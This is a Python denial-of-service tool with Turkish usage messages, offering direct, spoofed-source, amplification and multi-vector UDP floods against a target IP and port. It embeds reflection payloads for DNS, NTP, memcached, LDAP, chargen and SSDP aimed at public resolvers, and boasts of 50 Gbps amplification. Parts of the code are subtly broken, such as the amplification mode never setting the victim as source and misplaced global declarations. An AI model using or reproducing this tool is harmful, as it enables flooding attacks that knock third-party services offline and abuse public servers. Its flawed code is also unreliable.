#!/usr/bin/env python3
import socket, random, time, sys, threading, os, struct

_stop = False
_packets = 0
_bytes = 0
_lock = threading.Lock()

AMPLIFICATION = {
    53: b'\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x01\x00\x00\xff\xff\xff\xff\x00\x00\x29\xff\xff\x00\x00\x00\x00\x00\x00',
    123: b'\x17\x00\x03\x2a' + b'\x00' * 4,
    11211: b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n',
    19: b'\x00',
    389: b'\x30\x25\x02\x01\x01\x63\x20\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x00',
    1900: b'M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\nST: ssdp:all\r\nMan: "ssdp:discover"\r\nMX: 3\r\n\r\n',
}

REFLECTORS = [
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
    "208.67.222.222", "208.67.220.220", "9.9.9.9",
    "149.112.112.112", "64.6.64.6", "64.6.65.6",
    "185.228.168.9", "185.228.169.9"
]

def random_ip(): return f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
def random_port(): return random.randint(1024, 65535)

def direct_flood(ip, port, size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**20)
    payload = os.urandom(size)
    while not _stop:
        try:
            sock.sendto(payload, (ip, port))
            with _lock: global _packets, _bytes; _packets += 1; _bytes += size
        except: pass
    sock.close()

def spoofed_flood(ip, port, size):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        payload = os.urandom(size)
        total = 20 + 8 + size
        while not _stop:
            src_ip = random_ip()
            src_port = random_port()
            packet = (b'\x45\x00' + total.to_bytes(2, 'big') + random.randint(0,65535).to_bytes(2,'big') + b'\x00\x00' + b'\x40\x11' + b'\x00\x00' + socket.inet_aton(src_ip) + socket.inet_aton(ip) + src_port.to_bytes(2,'big') + port.to_bytes(2,'big') + (8+size).to_bytes(2,'big') + b'\x00\x00' + payload)
            sock.sendto(packet, (ip, 0))
            with _lock: _packets += 1; _bytes += total
    except: pass

def amp_flood(ip, reflectors):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**20)
    while not _stop:
        try:
            port = random.choice(list(AMPLIFICATION.keys()))
            payload = AMPLIFICATION[port]
            reflector = socket.gethostbyname(random.choice(reflectors))
            sock.sendto(payload, (reflector, port))
            with _lock: _packets += 1; _bytes += len(payload)
        except: pass
    sock.close()

def multi_flood(ip, port, reflectors):
    sock1 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock2 = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock1.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**20)
    sock2.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**20)
    sizes = [64, 128, 256, 512, 1024, 1400, 1500]
    while not _stop:
        try:
            size = random.choice(sizes)
            sock1.sendto(os.urandom(size), (ip, random.choice([port, random.randint(1,1024)])))
            if random.random() > 0.3:
                p = random.choice(list(AMPLIFICATION.keys()))
                sock2.sendto(AMPLIFICATION[p], (socket.gethostbyname(random.choice(reflectors)), p))
            with _lock: _packets += 2; _bytes += size + 64
        except: pass
    sock1.close(); sock2.close()

def stats(start):
    last_p, last_t = 0, start
    while not _stop:
        time.sleep(1)
        now = time.time()
        with _lock: p, b = _packets, _bytes
        pps = (p - last_p) / (now - last_t)
        mbps = (b * 8) / (1024 * 1024) / (now - start)
        print(f"\r\033[96m[STAT] {p:,} pkts | {pps:,.0f} pps | {mbps:.2f} Mbps | {mbps/1024:.2f} Gbps\033[0m", end='', flush=True)
        last_p, last_t = p, now

def main():
    if len(sys.argv) < 6:
        print("Kullanım: python3 udp.py <ip> <port> <sure> <thread> <mode> [size]")
        print("Mode: 1=Direct, 2=Spoof, 3=Amplification, 4=Multi-Vector")
        print("Örnek: python3 udp.py 45.192.176.20 53 60 800 3")
        sys.exit(1)

    ip, port, sure, thread, mode = sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4]), int(sys.argv[5])
    size = int(sys.argv[6]) if len(sys.argv) > 6 else 512

    print(f"\n\033[92mUDP FLOOD MODE {mode} -> {ip}:{port} | {thread} Thread | {sure}s\033[0m")
    if mode == 3: print("\033[93mAmplification Mode: 1 Gbps ile 50 Gbps vurabilirsin!\033[0m")
    if mode in [2,3] and os.geteuid() != 0: print("\033[93m[!] Mode 2/3 için root gerekli! sudo kullan.\033[0m"); sys.exit(1)

    funcs = {1: direct_flood, 2: spoofed_flood, 3: amp_flood, 4: multi_flood}
    if mode == 3: args = (ip, REFLECTORS)
    elif mode == 4: args = (ip, port, REFLECTORS)
    else: args = (ip, port, size)

    for _ in range(thread):
        threading.Thread(target=funcs[mode], args=args, daemon=True).start()
        time.sleep(0.001)

    threading.Thread(target=stats, args=(time.time(),), daemon=True).start()
    time.sleep(sure)
    global _stop; _stop = True
    time.sleep(1)
    with _lock: print(f"\n\033[92mToplam Paket: {_packets:,} | Ortalama PPS: {_packets/sure:,.0f}\033[0m")

if __name__ == "__main__":
    main()
